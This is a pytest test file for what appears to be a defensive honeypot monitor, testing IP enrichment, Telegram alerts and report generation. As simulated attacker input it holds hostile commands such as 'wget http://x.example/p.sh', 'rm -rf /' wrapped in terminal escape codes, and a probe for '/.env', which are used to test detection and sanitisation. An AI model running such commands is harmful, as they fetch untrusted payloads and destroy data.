"""Enrichment, alerts and report tests."""

from __future__ import annotations

import asyncio
from datetime import UTC, datetime
from pathlib import Path

import pytest

from honeywatch.alerts import TelegramAlerter, build_message, digest_message
from honeywatch.enrich import GeoEnricher, classify_address
from honeywatch.models import Event, RuleHit, Severity
from honeywatch.report import generate_ip_report, generate_report, parse_since
from honeywatch.storage.sqlite import Storage

NOW = datetime.now(UTC)


# ---- enrichment ----------------------------------------------------------


@pytest.mark.parametrize(
    ("ip", "category"),
    [
        ("8.8.8.8", "public"),
        ("192.168.1.5", "private"),
        ("127.0.0.1", "loopback"),
        ("169.254.1.1", "reserved"),
        ("203.0.113.9", "documentation"),
        ("2001:db8::1", "documentation"),
        ("::1", "loopback"),
        ("not-an-ip", "invalid"),
    ],
)
def test_address_classification(ip: str, category: str) -> None:
    assert classify_address(ip)[0] == category


def test_missing_database_degrades_gracefully(tmp_path: Path) -> None:
    enricher = GeoEnricher(tmp_path / "missing.mmdb", tmp_path / "missing2.mmdb")
    result = enricher.lookup("8.8.8.8")
    assert result.country is None
    assert not enricher.available
    enricher.close()


def test_private_addresses_need_no_database(tmp_path: Path) -> None:
    enricher = GeoEnricher()
    assert enricher.lookup("192.168.1.1").country == "LAN"
    assert enricher.lookup("127.0.0.1").country == "LO"
    assert enricher.lookup("203.0.113.5").country == "DOC"


def test_public_without_database_is_unknown() -> None:
    assert GeoEnricher().lookup("8.8.8.8").country is None


def test_invalid_address_does_not_raise() -> None:
    assert GeoEnricher().lookup("garbage").country is None


def test_cache_is_used(tmp_path: Path, monkeypatch) -> None:
    enricher = GeoEnricher()
    calls = {"n": 0}

    def fake(ip: str):  # pragma: no cover - only counting
        calls["n"] += 1
        return None

    monkeypatch.setattr(enricher, "_city_reader", fake, raising=False)
    enricher.lookup("8.8.8.8")
    enricher.lookup("8.8.8.8")
    info = enricher.cache_info()
    assert info.hits >= 1
    enricher.clear_cache()
    assert enricher.cache_info().currsize == 0


def test_enrich_event_applies_fields() -> None:
    from honeywatch.enrich import enrich_event

    event = Event(service="ssh", event_type="command", src_ip="192.168.0.9", session_id="s")
    enrich_event(GeoEnricher(), event)
    assert event.geo_country == "LAN"


# ---- alerts --------------------------------------------------------------


def alert_event() -> Event:
    return Event(
        ts=NOW,
        service="ssh",
        event_type="command",
        src_ip="203.0.113.1",
        session_id="s1",
        command="wget http://x.example/p.sh",
        username="root",
    )


def alert_hits(severity: str = "critical") -> list[RuleHit]:
    return [RuleHit(rule_id="ssh-download-exec-005", title="Download", severity=severity, ts=NOW)]


def test_disabled_alerter_needs_no_token() -> None:
    alerter = TelegramAlerter(token=None, chat_id="", min_severity=Severity.HIGH)
    assert not alerter.configured
    assert alerter.describe()["configured"] is False


def test_message_is_sanitized() -> None:
    hostile = Event(
        ts=NOW,
        service="ssh",
        event_type="command",
        src_ip="203.0.113.1",
        session_id="s",
        command="\x1b[31mwget http://x/[bold]pwned[/]",
    )
    message = build_message(hostile, alert_hits())
    assert "\x1b" not in message


def test_digest_message_groups_rules() -> None:
    message = digest_message([(alert_event(), alert_hits()[0]) for _ in range(3)])
    assert "ssh-download-exec-005 x3" in message


def test_collection_continues_when_alert_fails() -> None:
    """A total Telegram failure must never raise into the pipeline."""
    alerter = TelegramAlerter(
        token="tok", chat_id="123", min_severity=Severity.INFO, max_per_hour=20, retries=0
    )
    assert alerter.configured

    async def scenario() -> None:
        alerter.start()
        alerter.submit(alert_event(), alert_hits())
        await asyncio.wait_for(alerter.queue.join(), timeout=5)
        await alerter.stop()

    asyncio.run(scenario())


def test_rate_limit_suppresses_and_audits() -> None:
    storage = Storage(":memory:")
    alerter = TelegramAlerter(
        token="tok",
        chat_id="123",
        min_severity=Severity.INFO,
        max_per_hour=2,
        storage=storage,
        retries=0,
    )
    sent: list[str] = []

    async def fake_send(text: str) -> bool:
        sent.append(text)
        return True

    async def scenario() -> None:
        alerter._send = fake_send  # type: ignore[method-assign]
        for _ in range(5):
            await alerter._handle(alert_event(), alert_hits())  # noqa: SLF001

    asyncio.run(scenario())
    assert len(sent) == 2
    assert alerter.suppressed_count == 3
    assert storage.execute("SELECT COUNT(*) FROM alerts").fetchone()[0] == 5
    storage.close()


def test_min_severity_filter() -> None:
    alerter = TelegramAlerter(token="tok", chat_id="1", min_severity=Severity.CRITICAL)

    async def scenario() -> None:
        await alerter._handle(alert_event(), alert_hits("low"))  # noqa: SLF001
        assert alerter.sent_count == 0

    asyncio.run(scenario())


# ---- reports -------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "seconds"),
    [("24h", 86400), ("7d", 604800), ("30m", 1800), ("all", None), ("", None), ("90", 90)],
)
def test_parse_since(text: str, seconds: int | None) -> None:
    assert parse_since(text) == seconds


def test_parse_since_rejects_garbage() -> None:
    with pytest.raises(ValueError):
        parse_since("soon")


def test_report_contains_all_sections(tmp_path: Path) -> None:
    db = tmp_path / "rep.db"
    with Storage(db) as store:
        event = Event(
            ts=NOW,
            service="ssh",
            event_type="command",
            src_ip="203.0.113.5",
            session_id="s1",
            command="wget http://x.example/p.sh",
            username="root",
            password="123456",
        )
        store.insert_event(
            event,
            [RuleHit(rule_id="ssh-download-exec-005", attack="T1105", severity="critical", ts=NOW)],
        )
        store.insert_event(
            Event(
                ts=NOW,
                service="http",
                event_type="http_request",
                src_ip="198.51.100.2",
                http_method="GET",
                path="/.env",
            ),
            [RuleHit(rule_id="http-sensitive-path-010", attack="T1595.003", severity="medium", ts=NOW)],
        )
    from honeywatch.storage.queries import ReadStore

    with ReadStore(db) as read:
        text = generate_report(read, since="all")
    for heading in (
        "# HoneyWatch Report",
        "## Totals",
        "## Top attackers",
        "## Top credentials",
        "## Most attempted commands",
        "## Payload URLs observed",
        "## Rule detections",
        "## MITRE ATT&CK techniques observed",
        "## Notable sessions",
    ):
        assert heading in text


def test_report_sanitizes_hostile_content(tmp_path: Path) -> None:
    db = tmp_path / "evil.db"
    with Storage(db) as store:
        store.insert_event(
            Event(
                ts=NOW,
                service="ssh",
                event_type="command",
                src_ip="203.0.113.6",
                session_id="s1",
                command="\x1b[31mrm -rf / [bold]x[/]",
            )
        )
    from honeywatch.storage.queries import ReadStore

    with ReadStore(db) as read:
        text = generate_report(read, since="all")
    assert "\x1b" not in text
    assert "\\[" in text  # Rich/Markdown brackets escaped


def test_report_with_no_events(tmp_path: Path) -> None:
    db = tmp_path / "empty.db"
    with Storage(db):
        pass
    from honeywatch.storage.queries import ReadStore

    with ReadStore(db) as read:
        text = generate_report(read, since="all")
    assert "Totals" in text
    assert "_none observed_" in text


def test_ip_report(tmp_path: Path) -> None:
    db = tmp_path / "ip.db"
    with Storage(db) as store:
        store.insert_event(
            Event(
                ts=NOW,
                service="ssh",
                event_type="command",
                src_ip="203.0.113.7",
                session_id="s1",
                command="wget http://x.example/p.sh",
            ),
            [RuleHit(rule_id="r", severity="high", ts=NOW)],
        )
    from honeywatch.storage.queries import ReadStore

    with ReadStore(db) as read:
        text = generate_ip_report(read, "203.0.113.7")
    assert "# Attacker report" in text
    assert "Payload URLs" in text